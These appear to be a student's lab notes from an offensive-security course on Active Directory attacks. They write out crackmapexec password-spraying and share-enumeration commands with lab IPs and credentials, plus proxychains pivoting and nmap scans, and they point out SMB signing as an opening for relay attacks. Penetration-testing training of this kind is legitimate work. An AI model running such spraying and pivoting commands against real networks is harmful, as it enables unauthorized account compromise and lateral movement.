- [[AD Password Attacks]]
- [[Proxychains]]

- 2nd Type of Password spraying attack (SMB):  
- Drawback:  
- For example, for every authentication attempt, a full SMB connection has to be set up and then terminated.  
- **crackmapexec**  
- `cat users.txt`  
- `crackmapexec smb 192.168.200.75 -u usernames.txt -p 'Nexus123!' -d corp.com --continue-on-success`  
- smb = protocol  
- -u = username/file  
- -p = password  
- -d = domain  
- --continue-on-success = avoid stopping at the first valid credential  
- Bonus:  
- output of crackmapexec not only displays if credentials are valid, but also if the user with the identified credentials has admin priv on tgt system  
- Dave is a local admin on CLIENT75. Let's use crackmapexec with the password Flowers1 targeting this machine  
-`crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com`

Ex2
Use **crackmapexec** and check these credentials against SMB on MAILSRV1.

- `crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success`
- `crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares`

Ex3

- 1. Begin with CrackMapExec's SMB module to retrieve basic information of the identified servers (such as SMB settings). We'll also provide the credentials for _john_ to list the SMB shares and their permissions with **--shares**
        - `proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares`
            - [Note]:
                - `CrackMapExec version 5.4.0 may throw the error The NETBIOS connection with the remote host is timed out for DCSRV1, or doesn't provide any output at all. Version 5.4.1 contains a fix to address this issue`
        - result -> The output also states that MAILSRV1 and INTERNALSRV1 have SMB signing set to False. Without this security mechanism enabled, we can potentially perform _relay attacks_ if we can force an authentication request.
- Next, let's use **Nmap** to perform a port scan on ports commonly used by web applications and FTP servers targeting MAILSRV1, DCSRV1, and INTERNALSRV1. We have to specify **-sT** to perform a TCP connect scan. Otherwise, Nmap will not work over Proxychains.
    - `sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254`
- While we could use the SOCKS5 proxy and proxychains to browse to the open port on 172.16.6.241, we'll use **Chisel** as it provides a more stable and interactive browser session.